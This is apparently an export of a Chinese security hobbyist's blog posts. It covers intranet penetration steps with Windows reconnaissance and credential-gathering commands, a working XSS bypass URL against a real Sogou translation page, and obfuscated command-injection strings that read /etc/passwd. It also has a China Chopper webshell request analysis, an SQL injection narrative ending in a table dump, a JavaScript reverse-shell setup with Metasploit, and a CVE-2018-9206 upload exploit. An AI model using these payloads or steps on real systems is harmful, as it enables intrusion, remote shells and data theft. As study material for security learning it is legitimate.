      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透思路建立【待续】</title>
    <url>/2020/01/17/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E5%BB%BA%E7%AB%8B%E3%80%90%E5%BE%85%E7%BB%AD%E3%80%91/</url>
    <content><![CDATA[<h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><ol>
<li>工作组<br> 每台计算机都是对等的，<code>a</code>机器不能登录<code>b</code>机器。</li>
<li>域环境<br> 控制内网所有处于内外域环境的机器（方便大企业管理，不需要挨个计算机操作，只能域管理员登录）</li>
</ol>
<hr>
<ol>
<li>域机器<br> 可登录内外邮件服务器、<code>OA</code>服务器等</li>
<li>域用户<br> 员工</li>
<li>域管<br> 如<code>IT</code>部门的运维人员，维护安全和下发任务（每台机器该干什么）</li>
<li>域控<br> 控制很多台服务器的机器</li>
</ol>
<h2 id="内网攻击步骤"><a href="#内网攻击步骤" class="headerlink" title="内网攻击步骤"></a>内网攻击步骤</h2><h4 id="1-判断拿下的服务器是工作组（内网环境下用户a不能登陆用户b电脑）还是域机器（管理很多内网主机的）"><a href="#1-判断拿下的服务器是工作组（内网环境下用户a不能登陆用户b电脑）还是域机器（管理很多内网主机的）" class="headerlink" title="1. 判断拿下的服务器是工作组（内网环境下用户a不能登陆用户b电脑）还是域机器（管理很多内网主机的）"></a>1. 判断拿下的服务器是工作组（内网环境下用户<code>a</code>不能登陆用户<code>b</code>电脑）还是域机器（管理很多内网主机的）</h4><p><strong>工作组</strong>：<br>    要进行端口转发（将内网端口数据转发到外网，比如他<code>3389</code>端口只能内网连接，那么我们将他端口的<code>3389</code>数据转发到我们服务器的<code>33891</code>端口，然后连接<code>33891</code>就等同于连接他内外的<code>3389</code>端口）</p>
<h4 id="2-socket代理："><a href="#2-socket代理：" class="headerlink" title="2. socket代理："></a>2. <code>socket</code>代理：</h4><p><strong>正向代理</strong>：<br>    比如在内网机器打通一个可以连接他内网的渠道，然后在我们机器代理这个渠道就可以连通他内网，也可以理解为<code>VPN</code>概念，比如我们机器代理了<code>VPN</code>，那么我们就可以通过<code>VPN</code>访问到国内无法访问的<code>GOOGLE</code>（还不懂用下<code>VPN</code>然后找下中间的过程吧）<br><strong>反向代理</strong>：<br>    在自己的机器上建立一个连接渠道，然后将内网服务器连接我们机器的渠道，就可以连通他内网（可以想象成你在我家装了一个电话，然后你可以在你家和我通话，而正向代理是我在你家装了电话，然后我可以和你通话）</p>
<h4 id="3-利用第二步进入了内网，我们可以扫描弱口令（RDP弱口令、SSH弱口令、MSSQL弱口令、Tomcat弱口令…）和扫描web资产（扫描段下的有漏洞的服务，如Jboss、Weblogic、St2，内网日内网是比日外网较简单的，因为有人会觉得我把一些低安全性的服务搭建在内网，别人又打不开，莫得事。）"><a href="#3-利用第二步进入了内网，我们可以扫描弱口令（RDP弱口令、SSH弱口令、MSSQL弱口令、Tomcat弱口令…）和扫描web资产（扫描段下的有漏洞的服务，如Jboss、Weblogic、St2，内网日内网是比日外网较简单的，因为有人会觉得我把一些低安全性的服务搭建在内网，别人又打不开，莫得事。）" class="headerlink" title="3. 利用第二步进入了内网，我们可以扫描弱口令（RDP弱口令、SSH弱口令、MSSQL弱口令、Tomcat弱口令…）和扫描web资产（扫描段下的有漏洞的服务，如Jboss、Weblogic、St2，内网日内网是比日外网较简单的，因为有人会觉得我把一些低安全性的服务搭建在内网，别人又打不开，莫得事。）"></a>3. 利用第二步进入了内网，我们可以扫描弱口令（<code>RDP</code>弱口令、<code>SSH</code>弱口令、<code>MSSQL</code>弱口令、<code>Tomcat</code>弱口令…）和扫描<code>web</code>资产（扫描段下的有漏洞的服务，如<code>Jboss</code>、<code>Weblogic</code>、<code>St2</code>，<strong>内网日内网是比日外网较简单的，因为有人会觉得我把一些低安全性的服务搭建在内网，别人又打不开，莫得事。</strong>）</h4><h4 id="4-拿下了内网权限后，读密码，内网攻击步骤总归于密码收集，直到取到域管密码（如读取本机密码、服务密码、浏览器存储的用户信息等）"><a href="#4-拿下了内网权限后，读密码，内网攻击步骤总归于密码收集，直到取到域管密码（如读取本机密码、服务密码、浏览器存储的用户信息等）" class="headerlink" title="4. 拿下了内网权限后，读密码，内网攻击步骤总归于密码收集，直到取到域管密码（如读取本机密码、服务密码、浏览器存储的用户信息等）"></a>4. 拿下了内网权限后，读密码，<strong>内网攻击步骤总归于<code>密码收集</code>，直到取到域管密码</strong>（如读取本机密码、服务密码、浏览器存储的用户信息等）</h4><h4 id="5-信息收集"><a href="#5-信息收集" class="headerlink" title="5. 信息收集"></a>5. 信息收集</h4><p>1、查看本机权限（命令：<code>whoami /user</code>）（如果权限太低，我们可以进行提权，但一般都最好不要，因为如一些监测系统看到你执行了提权的<code>exploit</code>会有警报，然后运维人员发现了，更改了机器的密码什么的，就功亏一篑，或者护网情况下，可能会把他们机器搞崩溃，如<code>exploit</code>导致服务干嘛干嘛的，<strong>而且一般普通用户权限，只要不会低的什么都不能干，都可以信息收集，和取密码</strong>）</p>
<p>2、查看网络连接信息（命令：<code>netstat -ano</code>），可以看到<code>TCP</code>、<code>UDP</code>信息，用此命令于获取内网<code>IP</code>分布（如可以看到外网的什么<code>IP</code>连接了内网的什么，也可以用于应急响应，比如可以看哪个逼连接进来了内网什么的）</p>
<p>3、查看系统信息（命令：<code>systeminfo</code>，比如看系统打的补丁、网卡信息等、操作系统版本… 具体自己执行看看）</p>
<p>4、查看安装的杀毒软件（命令：<code>WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</code>），但不一定是完整的</p>
<p>5、查看当前安装的程序（命令：<code>wmic product get name,version</code>）</p>
<p>6、查看在线用户，比如有些管理员<code>3389</code>连接着，并没有关闭，那么我们就可以看（命令：<code>quser</code>）</p>
<p>7、查看网络配置（也可以看<code>DNS</code>信息，如果有是域内，如果没有应该是工作组）（命令：<code>ipconfig /all</code>）</p>
<p>8、查看进程信息（命令：<code>tasklist /v</code>），比如可能某个进程是域管创的，那么我们可以通过管理员权限凭证窃取来获取<code>hash</code>值来拿下域（等同于<code>web</code>的拿下管理员<code>cookie</code>然后利用<code>cookie</code>登录后台管理网站）</p>
<p>9、查看当前登录域（命令：<code>net config workstation</code>）</p>
<p>10、查看<code>Window</code>远程连接历史记录（命令：<code>cmdkey /l</code>），如果保存了连接凭证，我们可以取夏利解密然后登录</p>
<p>11、查看本机用户列表（<code>net user</code>）</p>
<p>12、查看本机用户<code>Fuck</code>的信息（命令：<code>net user Fuck</code>）</p>
<p>13、显示所在域的用户名单（命令：<code>net user /domain</code>）</p>
<p>14、获取某个域用户的详细信息（命令：<code>net user 域用户 /domain</code>）</p>
<p>15、修改域管理员密码，需要域管权限（命令：<code>net user /domain username password</code>）</p>
<p>16、待续更新</p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>搜狗一处xss绕过</title>
    <url>/2020/01/15/%E6%90%9C%E7%8B%97%E4%B8%80%E5%A4%84xss%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<blockquote>
<p>本来只是上网搜索一下不懂的英文，然后就引发此文了</p>
</blockquote>
<h3 id="突发异想"><a href="#突发异想" class="headerlink" title="突发异想"></a>突发异想</h3><p>首先正常打开是 中文 翻译为 英文，如图</p>
<p><img src="http://static.zybuluo.com/1kbfree/dsvm28cx8zsafl4gmpx5qen2/666.png" alt="666.png-49.1kB"></p>
<p>然后就在想，中文转英文会出翻译结果（这里我指的是输出的可控字符和返回的不一样，我想打<code>xss</code>这显然不符合，所以我应该找其他语言翻译解决这个问题），然后我试了一下日语 翻译为 英文</p>
<p><img src="http://static.zybuluo.com/1kbfree/fkkgb74g5kun0eibp1zoevvc/666.png" alt="666.png-90.5kB"></p>
<p>设想实现了，直接试试打<code>poc</code></p>
<p><img src="http://static.zybuluo.com/1kbfree/qww8tbr0ymsxpfoye2obqlys/666.png" alt="666.png-125.7kB"></p>
<p>哦吼</p>
<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;translate.sogou.com&#x2F;#ja&#x2F;en&#x2F;123%22%3E%3Cscript%3Ealert(1)</span></pre></td></tr></table></figure>

<blockquote>
<p>不给我执行<code>&lt;script&gt;</code>可以，但你已经执行了<code>&lt;hr&gt;</code>就不行，所以我必须绕</p>
</blockquote>
<p>害，懒得写过程了，直接丢出来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;translate.sogou.com&#x2F;#ja&#x2F;en&#x2F;cron%22%3E%3Cscript%3E(alert)(1);</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/tavk32rgcisg7luj2g80foi0/666.png" alt="666.png-116.8kB"></p>
<blockquote>
<p>凭感觉绕的，瞎想觉得这样可以然后就试试然后就真可以了。</p>
</blockquote>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>2020年初到</title>
    <url>/2020/01/01/2020%E5%B9%B4%E5%88%9D%E5%88%B0/</url>
    <content><![CDATA[<p>曾经在作文写的<code>2020</code>年，如今已经到了，我不得不感慨时间流逝的太快，很多事还没缓过来，人就已经长大了。</p>
<p>依然记得上年年初列的目标，如今它已经过了，而我未达到一半条数，不愧是我，不一样的烟火。</p>
<p>过去的已过去，愿大家去年所有的遗憾都会变成今年惊喜的垫铺。</p>
<h3 id="2020年目标："><a href="#2020年目标：" class="headerlink" title="2020年目标："></a><code>2020</code>年目标：</h3><ul>
<li>内网渗透</li>
<li>挖进腾讯<code>SRC</code>年度前十</li>
<li>博客最低一周一更</li>
<li>存款六位数以上（今年支出了<code>30w+</code>，收入<code>25w</code>不到）</li>
</ul>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>感慨</tag>
      </tags>
  </entry>
  <entry>
    <title>命令执行绕过Payload</title>
    <url>/2019/12/31/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87Payload/</url>
    <content><![CDATA[<h3 id="利用连接符来执行命令"><a href="#利用连接符来执行命令" class="headerlink" title="利用连接符来执行命令"></a>利用连接符来执行命令</h3><p>读取<code>/etc/passwd</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#39;b&#39;i&#39;n&#39;&#x2F;&#39;c&#39;a&#39;t&#39; &#x2F;&#39;e&#39;t&#39;c&#39;&#x2F;&#39;p&#39;a&#39;s&#39;s&#39;w&#39;d</span></pre></td></tr></table></figure>

<p>执行<code>ls</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#39;&#39;l&#39;&#39;s&#39;&#39;&#39;</span></pre></td></tr></table></figure>

<p>查看<code>nc</code>是否安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#x2F;&#39;&#39;b&#39;i&#39;n&#39;&#x2F;&#39;w&#39;h&#39;i&#39;c&#39;h&#39; &#39;n&#39;&#39;c&#39;&#39;&#39;</span></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&quot;b&quot;i&quot;n&quot;&#x2F;&quot;w&quot;h&quot;i&quot;c&quot;h&quot; &quot;n&quot;c</span></pre></td></tr></table></figure>

<p>又或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;b\i\n&#x2F;w\h\i\c\h n\c</span></pre></td></tr></table></figure>

<h3 id="利用未初始化的bash"><a href="#利用未初始化的bash" class="headerlink" title="利用未初始化的bash"></a>利用未初始化的<code>bash</code></h3><p>先来看看没有定义的变量($a)</p>
<p><img src="http://static.zybuluo.com/1kbfree/bm5u61qgfr0zqjardb7m17ic/image_1cos7tbn91v4cemf93d1184ids9.png" alt="image_1cos7tbn91v4cemf93d1184ids9.png-10.5kB"></p>
<p>可以看到返回的是<code>null</code>，那么可以去利用这个特性来执行其他命令</p>
<p><img src="http://static.zybuluo.com/1kbfree/r9njqwcbq2cg191t01n7z23u/image_1cos80n882kshpq1g2413pu1dc9m.png" alt="image_1cos80n882kshpq1g2413pu1dc9m.png-63kB"></p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>好奇心-菜刀连接shell进行了什么操作</title>
    <url>/2019/12/31/%E5%A5%BD%E5%A5%87%E5%BF%83-%E8%8F%9C%E5%88%80%E8%BF%9E%E6%8E%A5shell%E8%BF%9B%E8%A1%8C%E4%BA%86%E4%BB%80%E4%B9%88%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>我们都知道，只要写入了一个脚本文件，然后接受一个参数来执行代码，菜刀连接上去我们就可以进行增删改查权限了，那么这个时候菜刀究竟干了什么？我们来看看</p>
<p>1、我在本地写了一个<code>shell</code>，密码为<code>eiywexdtolthvzztvoyfuoqglpcjlwerifzzrzslutzxutreje</code></p>
<p>2、设置菜刀代理为我们<code>burp</code>的带来来接收数据</p>
<p><img src="http://static.zybuluo.com/1kbfree/7xjvhyoolltp31rjbnz9lk3q/1.png" alt="1.png-10kB"></p>
<p>然后连接进去<code>burl</code>就会抓取一个数据包</p>
<p><img src="http://static.zybuluo.com/1kbfree/zrmmmr8dydxcw5u9ezvz14tn/image_1dtc796181uea1rcf1e4n8lb1mi29.png" alt="image_1dtc796181uea1rcf1e4n8lb1mi29.png-180.4kB"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /Joomla_3<span class="number">.4</span><span class="number">.6</span>-Stable-Full_Package<span class="comment">//configuration.php HTTP/1.1</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">User-Agent: Java/<span class="number">1.8</span><span class="number">.0</span>_161</span></pre></td></tr><tr><td class="code"><pre><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept: text/html, image/gif, image/jpeg, *; q=<span class="number">.2</span>, *<span class="comment">/*; q=.2</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">Content-type: application/x-www-form-urlencoded</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">Content-Length: 689</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">Connection: close</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment"></span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">eiywexdtolthvzztvoyfuoqglpcjlwerifzzrzslutzxutreje=<span class="doctag">@eval</span>(base64_decode($_POST[action]));&amp;action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtlY2hvKCItJmd0O3wiKTs7JEQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pO2lmKCREPT0iIikkRD1kaXJuYW1lKCRfU0VSVkVSWyJQQVRIX1RSQU5TTEFURUQiXSk7JFI9InskRH1cdCI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQSIsIloiKSBhcyAkTClpZihpc19kaXIoInskTH06IikpJFIuPSJ7JEx9OiI7fSRSLj0iXHQiOyR1PShmdW5jdGlvbl9leGlzdHMoInBvc2l4X2dldGVnaWQiKSk%2fQHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOiIiOyR1c3I9KCR1KT8kdVsibmFtZSJdOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iKHskdXNyfSkiO3ByaW50ICRSOztlY2hvKCJ8Jmx0Oy0iKTtkaWUoKTs%3d</span></span></pre></td></tr></table></figure>

<p>大概流程就是执行<code>eval</code>，然后<code>base64</code>解码<code>action</code>的参数，我们编码看看执行了什么代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@ini_set(<span class="string">"display_errors"</span>,<span class="string">"0"</span>);@set_time_limit(<span class="number">0</span>);<span class="keyword">echo</span>(<span class="string">"-&amp;gt;|"</span>);;$D=base64_decode($_POST[<span class="string">"z1"</span>]);$F=@opendir($D);<span class="keyword">if</span>($F==<span class="keyword">NULL</span>)&#123;<span class="keyword">echo</span>(<span class="string">"ERROR:// Path Not Found Or No Permission!"</span>);&#125;<span class="keyword">else</span>&#123;$M=<span class="keyword">NULL</span>;$L=<span class="keyword">NULL</span>;<span class="keyword">while</span>($N=@readdir($F))&#123;$P=$D.<span class="string">"/"</span>.$N;$T=@date(<span class="string">"Y-m-d H:i:s"</span>,@filemtime($P));@$E=substr(base_convert(@fileperms($P),<span class="number">10</span>,<span class="number">8</span>),<span class="number">-4</span>);$R=<span class="string">"\t"</span>.$T.<span class="string">"\t"</span>.@filesize($P).<span class="string">"\t"</span>.$E.<span class="string">"</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">"</span>;<span class="keyword">if</span>(@is_dir($P))$M.=$N.<span class="string">"/"</span>.$R;<span class="keyword">else</span> $L.=$N.$R;&#125;<span class="keyword">echo</span> $M.$L;@closedir($F);&#125;;<span class="keyword">echo</span>(<span class="string">"|&amp;lt;-"</span>);<span class="keyword">die</span>(KTs=</span></pre></td></tr></table></figure>

<blockquote>
<p>列了当前路径、计算机名、计算机系统等信息，然后下个请求读取当前路径的文件，然后我们点击哪个文件就会<code>fopen</code>哪个文件，并且列出字节数、创建时间。</p>
</blockquote>
<p>其实还挺简单的，然后一些免杀菜刀就是改底层然后修改获取这些目录、文件的代码，和绕过<code>shell</code>一样的，有空我再看看，此文章没学习性，我就是好奇看看</p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title>一次困难的渗透记录[思路描述]</title>
    <url>/2019/12/28/%E4%B8%80%E6%AC%A1%E5%9B%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95-%E6%80%9D%E8%B7%AF%E6%8F%8F%E8%BF%B0/</url>
    <content><![CDATA[<h2 id="故事开局"><a href="#故事开局" class="headerlink" title="故事开局"></a>故事开局</h2><p>一个朋友的同学的老师没当教师了，转去<code>IT</code>行业，然后他们公司有一个项目上线很久了，觉得不安全，找到我帮忙测试让我获取<code>shell</code>或者看<code>test</code>表下的数据（我一开始以为很多钱，结果给我一条烟的钱，什么烟？？1906啊），这里记录下过程</p>
<p>各攻击点环环受阻，<code>cnm****</code></p>
<blockquote>
<p>这个注入点是这样的。。。<br>1、找到一个注入点，注入参数不能<code>url</code>编码，而且语句有时候会变（没遇到过，求解释）<br>2、有编辑器漏洞但上传目录没有写权限<br>3、第二个编辑器有上传漏洞但显示上传目录不存在。。。<br>4、<code>.git</code>泄露，但打包的不完整。。。<br>5、找不到后台。。。<br>6、注入想写<code>shell</code>结果是站库分离。。。。。。。。。。。。。</p>
</blockquote>
<blockquote>
<p>大部分口头描述，主要描述思路，敏感时期</p>
</blockquote>
<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>1、扫描主站目录的时候跑出来了一个日志信息<code>xxx.xxx.xxx/logs/web.log</code>，大致信息是大马操作痕迹。。和<code>xss</code>、目录扫描、<code>sql</code>注入扫描记录（应该是之前有测试过或者被黑过）</p>
<p>2、扫描子域名，在一处子域名下获取了<code>.git</code>源码泄露漏洞，然后利用<code>lijiejie</code>的<code>GitHack</code>工具直接打包，但是他总共<code>807</code>个文件，只下载了<code>26</code>个文件（不知道怎么回事，下载失败的都显示<code>File not found</code>，没理解过<code>.git</code>泄露漏洞），然后没下载的文件都列出了目录地址（下载失败，但文件都是存在的）</p>
<p>3、用<code>git</code>泄露获取了<code>mysql</code>配置信息，但是他用的是阿里云数据库，站库分离，且限定<code>ip</code>才能连接，此利用链无果</p>
<p>4、利用第二步获取了全站的目录信息（这个漏洞和我说没危害。。），然后找到了一个<code>editor</code>编辑器漏洞，尝试上传文件</p>
<p><img src="http://static.zybuluo.com/1kbfree/bycimn8qr4qsiehgz79m6hzu/333.jpg" alt="333.jpg-184.1kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/jxswr1pwt2ly2ofp1gr4nd16/1.png" alt="1.png-50.2kB"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;error&quot;:1,&quot;message&quot;:&quot;\u4e0a\u4f20\u76ee\u5f55\u6ca1\u6709\u5199\u6743\u9650\u3002&quot;&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">解码后</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;&quot;error&quot;:1,&quot;message&quot;:&quot;上传目录没有写权限。&quot;&#125;</span></pre></td></tr></table></figure>

<p>5、在另一个子域名下也找到了这个编辑器漏洞（<code>上传目录不存在</code>）。。</p>
<p>6、然后现在测试已经是第五天了（中间一直摸鱼），找到了一个注入，手工测是可以直接用的，然后丢<code>sqlmap</code>一片红</p>
<p>此注入条件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、不能编码</span></pre></td></tr><tr><td class="code"><pre><span class="line">2、逻辑达到一定的时候，语句会变，我不太懂sql注入，所以描述的不明白</span></pre></td></tr><tr><td class="code"><pre><span class="line">3、这是个显错注入</span></pre></td></tr><tr><td class="code"><pre><span class="line">4、注入的参数是这样的&#96;&#x2F;xxxxx-xxxx-注入点-999.htm&#96;</span></pre></td></tr></table></figure>

<p>然后我手工注入（懒不想手注）的时候用<code>or updatexml(0,concat(0x7e,(这里可以直接执行语句)),0)</code>，然后利用<code>sqlmap</code>的<code>--skip-urlencode</code>和<code>--suffix=</code>、<code>--prefix=</code>指定前缀后缀依旧失败（因为我想让<code>sqlmap</code>的<code>payload</code>在<code>updatexml(0,concat(0x7e,(这里执行)),0)</code>），经过很多失败后，我想到了一个新的点~ 利用<code>php</code>请求注入点，接受<code>payload</code>带入到<code>updatexml</code>函数里</p>
<p><img src="http://static.zybuluo.com/1kbfree/u9owymsb8gthlfcs5hhxuzzs/2.png" alt="2.png-83.9kB"></p>
<p>然后直接跑</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;localhost&#x2F;sql.php?payload&#x3D;* -v 5</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/rpwph6pap9dkw9xx4nb1oksf/3.png" alt="3.png-346.8kB"></p>
<p>然后直接找<code>test</code>表然后<code>dump</code>就完成了。</p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
        <category>好文</category>
      </categories>
      <tags>
        <tag>Hacker</tag>
      </tags>
  </entry>
  <entry>
    <title>利用js反弹shell</title>
    <url>/2019/12/24/%E5%88%A9%E7%94%A8js%E5%8F%8D%E5%BC%B9shell/</url>
    <content><![CDATA[<blockquote>
<p><code>JavsScript</code>是可以通过创建<code>ActiveXObject</code>来执行命令，但是基本上不会存在，因为需要一定的设置且使用<code>ie</code>浏览器打开</p>
</blockquote>
<h2 id="漏洞复现设置"><a href="#漏洞复现设置" class="headerlink" title="漏洞复现设置"></a>漏洞复现设置</h2><blockquote>
<p>默认是没有开启<code>ActiveX</code>控件的，那么我们可以自己设置</p>
</blockquote>
<p><img src="http://static.zybuluo.com/1kbfree/l46moufgdhywq1jacdki0t7x/image_1dsrj1kpt1ru5ncn1gmpa7s2hp.png" alt="image_1dsrj1kpt1ru5ncn1gmpa7s2hp.png-118.4kB"></p>
<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>这里用<code>js</code>反弹<code>shell</code></p>
<blockquote>
<p>下载工具：<br><a href="https://github.com/CroweCybersecurity/ps1encode" target="_blank" rel="noopener">https://github.com/CroweCybersecurity/ps1encode</a></p>
</blockquote>
<p>使用如下命令生成反弹<code>shell</code>的<code>js</code>代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;ps1encode.rb --LHOST 192.168.31.133 --LPORT 6666 --PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp --ENCODE cmd -t js</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/wp2t4ehl24nb0r5ut2xfu479/image_1dsrjbg326pj1dd61fps31fimf16.png" alt="image_1dsrjbg326pj1dd61fps31fimf16.png-184.5kB"></p>
<p>然后把他放到<code>index.html</code>页面，代码如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	</span></pre></td></tr><tr><td class="code"><pre><span class="line">	生成的js代码</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></pre></td></tr></table></figure>

<p>然后在<code>msf</code>上面监听</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler</span></pre></td></tr><tr><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LHOST 192.168.31.133</span></pre></td></tr><tr><td class="code"><pre><span class="line">LPORT &#x3D;&gt; 192.168.31.133</span></pre></td></tr><tr><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LPORT 6666</span></pre></td></tr><tr><td class="code"><pre><span class="line">LPORT &#x3D;&gt; 6666</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/ybufmiybwtda7no5jfodemxb/image_1dsrjgsu3cpnj5nl96letqj31j.png" alt="image_1dsrjgsu3cpnj5nl96letqj31j.png-293.6kB"></p>
<p>然后在<code>ie</code>浏览器上打开<code>index.html</code>页面，在<code>msf</code>就成功接收到反弹过来的<code>shell</code>了</p>
<p><img src="http://static.zybuluo.com/1kbfree/haf06syd6xzlc17tcafzdl1w/image_1dsrjj69j12lhifaap21q7ijuo2g.png" alt="image_1dsrjj69j12lhifaap21q7ijuo2g.png-163.6kB"></p>
<p>如果对方足够傻的情况下，是可以利用社工完成这些设置操作步骤的，但是如果真够傻的话往常直接丢<code>exe</code>给他更好。</p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2018-9206漏洞复现及原理</title>
    <url>/2019/12/24/CVE-2018-9206%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><blockquote>
<p>下载地址：<br><a href="https://codeload.github.com/blueimp/jQuery-File-Upload/zip/v9.22.0" target="_blank" rel="noopener">https://codeload.github.com/blueimp/jQuery-File-Upload/zip/v9.22.0</a></p>
</blockquote>
<p>此漏洞是在<code>15</code>年的时候就已经出现的，但是是在<code>18</code>年的时候才列为<code>cve</code>编号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">漏洞影响版本</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">version &lt;&#x3D; 9.22.0 and with Apache &gt; 2.3.9</span></pre></td></tr></table></figure>

<h2 id="使用curl上传shell"><a href="#使用curl上传shell" class="headerlink" title="使用curl上传shell"></a>使用<code>curl</code>上传<code>shell</code></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -F &quot;files&#x3D;@phpinfo.php&quot; http:&#x2F;&#x2F;127.0.0.1&#x2F;jQuery-File-Upload-9.22.0&#x2F;server&#x2F;php&#x2F;index.php</span></pre></td></tr><tr><td class="code"><pre><span class="line"># 将phpinfo.php上传</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/lqb5p87burx4ws0ihcuu20gg/image_1dsreqlnppj66m06lc11a31okd9.png" alt="image_1dsreqlnppj66m06lc11a31okd9.png-19kB"></p>
<p>然后访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:\&#x2F;\&#x2F;127.0.0.1\&#x2F;jQuery-File-Upload-9.22.0\&#x2F;server\&#x2F;php\&#x2F;files\&#x2F;phpinfo.php</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/h5qqv34v9jjwmsp8amodqqh2/image_1dsrerqviatkd4v8io1o2a199tm.png" alt="image_1dsrerqviatkd4v8io1o2a199tm.png-86kB"></p>
<h2 id="使用工具上传shell"><a href="#使用工具上传shell" class="headerlink" title="使用工具上传shell"></a>使用工具上传<code>shell</code></h2><blockquote>
<p>下载地址：<br><a href="https://github.com/lcashdol/Exploits/tree/master/CVE-2018-9206" target="_blank" rel="noopener">https://github.com/lcashdol/Exploits/tree/master/CVE-2018-9206</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;CVE-2018-9206.sh http:&#x2F;&#x2F;192.168.8.100&#x2F;jQuery-File-Upload-9.22.0&#x2F;</span></pre></td></tr></table></figure>

